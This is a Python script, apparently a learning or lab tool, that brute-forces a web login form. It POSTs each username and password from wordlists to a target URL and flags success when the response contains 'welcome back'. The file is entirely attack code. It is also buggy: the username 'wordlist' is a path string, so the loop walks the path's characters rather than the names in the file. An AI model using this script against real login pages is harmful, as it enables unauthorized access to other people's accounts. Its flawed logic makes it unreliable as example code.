# Modules
import requests
import sys

# FIXME: Input validation
if len(sys.argv) != 4:
   print("Invalid argument.")
   print(" >>$ {} <URL or IP Address> <Path to username wordlist> <Path to password wordlist>".format(sys.argv[0]))
   exit()

# can define any port for running against web apps
# target = "http://127.0.0.1:5000"
# usernames = ["admin", "user", "test"]
# passwords = "top-100.txt"

# FIXME: New variable assignments
target = sys.argv[1] # Specified target login URL
usernames = sys.argv[2] # Path to a wordlist of usernames
passwords = sys.argv[3] # Path to a wordlist of passwords

# used to determine if login was a success or failure
needle = "welcome back"

for username in usernames:
    with open(passwords, "r") as passwords_list:
        for password in passwords_list:
            password = password.strip("\n").encode()
            sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode()))
            sys.stdout.flush()
            r = requests.post(target, data = {"username": username, "password": password})
            if needle.encode() in r.content:
                sys.stdout.write("\n")
                sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'.".format(password.decode(), username))
                sys.exit()
        sys.stdout.flush()
        sys.stdout.write("\n")
        sys.stdout.write("\tNo password found for user: {}.".format(username))
        sys.stdout.write("\n")
